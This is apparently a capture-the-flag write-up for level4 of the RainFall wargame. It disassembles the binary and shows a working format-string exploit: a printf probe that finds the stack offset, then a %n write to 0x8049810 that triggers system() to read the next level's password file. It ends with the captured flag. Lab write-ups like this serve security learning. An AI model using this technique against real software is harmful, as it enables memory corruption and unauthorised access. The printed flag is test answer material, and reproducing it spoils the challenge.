so let's try to launch the program

and try to do some test

./level4
a
a


so let's decompile the software 


gef➤  disassemble *main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
gef➤  disassemble *n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
=> 0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.


so is call fgets with a buffer of 0x200 so 512 octet  and the buffer is enough big to is 520 octet so no buffer overflow here
but looks more close to the p function 



gef➤  disassemble *p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
gef➤  


so is get the buffer from fgets and put to printf directly is a big exploitation here 


   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  

and after is compare the value to 16930116 and is correct is print the result of content in /bin/cat /home/user/level5/.pass',0


so let's try to break in


create a buffer of printf to now wich arg is possible to exploitation

python3 -c 'print("AAAA" + "%x " * 10)' | ./level4

level4@RainFall:~$ python -c 'print("AAAA" + "%X " * 50)' | ./level4
AAAAB7FF26B0 BFFFF694 B7FD0FF4 0 0 BFFFF658 804848D BFFFF450 200 B7FD1AC0 B7FF37D0 41414141 25205825


so the 12 argument is exploitable 

let's try to create buffer with element

addr of the buffer you want to change is 0x8049810
and i want to compare with the value 16930116

but is not possible to wrie 16930116 before so i use the trick to creat padding 16930116 space before 
just need to substricte 4 because il already send with addr 

addr 0x8049810 +  %16930112d + %12$n

and found the flag !
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a